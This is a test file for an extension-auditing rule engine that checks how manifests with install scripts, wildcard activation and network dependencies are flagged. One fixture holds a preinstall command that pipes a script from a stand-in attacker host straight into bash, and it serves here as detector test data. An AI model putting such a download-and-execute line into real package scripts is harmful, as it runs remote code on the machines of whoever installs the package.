// extaudit - Rule engine tests
import { describe, it } from "node:test";
import assert from "node:assert";
import { RuleEngine } from "../dist/rules/engine.js";

const benignManifest = {
  name: "safe-ext",
  version: "1.0.0",
  displayName: "Safe Extension",
  publisher: "trusted-pub",
  activationEvents: ["onCommand:safe.doSomething"],
  dependencies: {},
  devDependencies: {},
  scripts: {},
  extensionPath: "/fake/safe-ext",
  hasPostInstall: false,
  raw: { name: "safe-ext", engines: { vscode: "^1.80.0" }, verifiedCreator: true },
};

const suspiciousManifest = {
  name: "bad-ext",
  version: "0.1.0",
  publisher: undefined,
  activationEvents: ["*"],
  dependencies: { axios: "^1.6.0" },
  devDependencies: {},
  scripts: { postinstall: "node setup.js", preinstall: "curl https://evil.com/setup.sh | bash" },
  extensionPath: "/fake/bad-ext",
  hasPostInstall: true,
  raw: { name: "bad-ext" },
};

const networkManifest = {
  name: "net-ext",
  version: "2.0.0",
  publisher: "net-pub",
  activationEvents: ["onCommand:net.sync", "onStartupRemote"],
  dependencies: { "node-fetch": "^3.0.0", got: "^14.0.0" },
  devDependencies: {},
  scripts: {},
  extensionPath: "/fake/net-ext",
  hasPostInstall: false,
  raw: { name: "net-ext" },
};

describe("RuleEngine", () => {
  it("scores a benign extension as info (score 0)", () => {
    const engine = new RuleEngine();
    const result = engine.evaluate(benignManifest);
    assert.strictEqual(result.score, 0, `Expected 0, got ${result.score}`);
    assert.strictEqual(result.label, "info");
    assert.strictEqual(result.findings.length, 0);
  });

  it("flags postinstall script in suspicious extension", () => {
    const engine = new RuleEngine();
    const result = engine.evaluate(suspiciousManifest);
    assert.ok(result.score > 0, `Expected score > 0, got ${result.score}`);
    const postInstallFinding = result.findings.find((f) => f.ruleId === "scripts-postinstall");
    assert.ok(postInstallFinding !== undefined, "Should detect postinstall");
    assert.strictEqual(postInstallFinding?.severity, "critical");
  });

  it("flags preinstall script", () => {
    const engine = new RuleEngine();
    const result = engine.evaluate(suspiciousManifest);
    const preInstallFinding = result.findings.find((f) => f.ruleId === "scripts-preinstall");
    assert.ok(preInstallFinding !== undefined, "Should detect preinstall");
  });

  it("detects star activation event", () => {
    const engine = new RuleEngine();
    const result = engine.evaluate(suspiciousManifest);
    const starFinding = result.findings.find((f) => f.ruleId === "network-activation-on-startup");
    assert.ok(starFinding !== undefined, "Should detect star activation");
  });

  it("detects unknown publisher", () => {
    const engine = new RuleEngine();
    const result = engine.evaluate(suspiciousManifest);
    const pubFinding = result.findings.find((f) => f.ruleId === "publisher-unknown");
    assert.ok(pubFinding !== undefined, "Should detect unknown publisher");
  });

  it("detects network dependencies", () => {
    const engine = new RuleEngine();
    const result = engine.evaluate(networkManifest);
    const netFinding = result.findings.find((f) => f.ruleId === "network-fetch-import");
    assert.ok(netFinding !== undefined, "Should detect network imports");
    assert.ok(netFinding?.evidence.some((e) => e.includes("node-fetch")));
    assert.ok(netFinding?.evidence.some((e) => e.includes("got")));
  });

  it("can disable specific rules", () => {
    const engine = new RuleEngine(undefined, ["scripts-postinstall"]);
    const result = engine.evaluate(suspiciousManifest);
    const postInstallFinding = result.findings.find((f) => f.ruleId === "scripts-postinstall");
    assert.strictEqual(postInstallFinding, undefined, "Postinstall rule should be disabled");
  });

  it("enable takes precedence over disable", () => {
    const engine = new RuleEngine(undefined, ["scripts-postinstall"], ["scripts-postinstall"]);
    const result = engine.evaluate(suspiciousManifest);
    const postInstallFinding = result.findings.find((f) => f.ruleId === "scripts-postinstall");
    assert.ok(postInstallFinding !== undefined, "Enabled should override disabled");
  });

  it("scores never exceed 100", () => {
    const engine = new RuleEngine();
    const result = engine.evaluate(suspiciousManifest);
    assert.ok(result.score <= 100, `Score ${result.score} should not exceed 100`);
  });

  it("evaluateAll processes multiple manifests", () => {
    const engine = new RuleEngine();
    const results = engine.evaluateAll([benignManifest, suspiciousManifest]);
    assert.strictEqual(results.length, 2);
    assert.strictEqual(results[0].extensionName, "safe-ext");
    assert.strictEqual(results[1].extensionName, "bad-ext");
  });

  it("getRules returns all including disabled", () => {
    const engine = new RuleEngine(undefined, ["scripts-postinstall"]);
    const rules = engine.getRules();
    assert.ok(rules.length >= 8, `Expected at least 8 rules, got ${rules.length}`);
    const disabledRule = rules.find((r) => r.id === "scripts-postinstall");
    assert.strictEqual(disabledRule?.enabled, false);
  });

  it("getEnabledRules excludes disabled rules", () => {
    const engine = new RuleEngine(undefined, ["scripts-postinstall"]);
    const enabled = engine.getEnabledRules();
    assert.strictEqual(enabled.find((r) => r.id === "scripts-postinstall"), undefined);
  });

  it("getAppliedRuleIds returns only enabled rule IDs", () => {
    const engine = new RuleEngine(undefined, ["scripts-postinstall"]);
    const ids = engine.getAppliedRuleIds();
    assert.ok(!ids.includes("scripts-postinstall"));
  });
});
